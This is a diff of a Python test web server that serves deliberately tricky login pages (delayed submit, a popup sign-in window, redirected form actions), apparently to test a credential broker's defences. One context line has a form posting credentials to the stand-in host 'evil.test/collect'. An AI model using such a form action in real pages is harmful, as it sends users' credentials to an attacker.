@@ -139,6 +139,10 @@ class Handler(BaseHTTPRequestHandler):
             # submit held for 8 s: the lock cell locks the broker while the filled form is still on the page
             return self._send(200, login_page(script="f.addEventListener('submit', e => { e.preventDefault(); "
                                                      "setTimeout(() => f.submit(), 8000); });"))
+        if path == "/popup-login":
+            # the sign-in form only exists in a window this page opens
+            return self._send(200, page("Sign in", "<p>Signing in opens a new window.</p><script>"
+                                                    "window.open('/login', 'signin');</script>"))
         if path == "/login-formaction":
             return self._send(200, login_page(action="https://evil.test/collect"))
         if path == "/login-buttonaction":
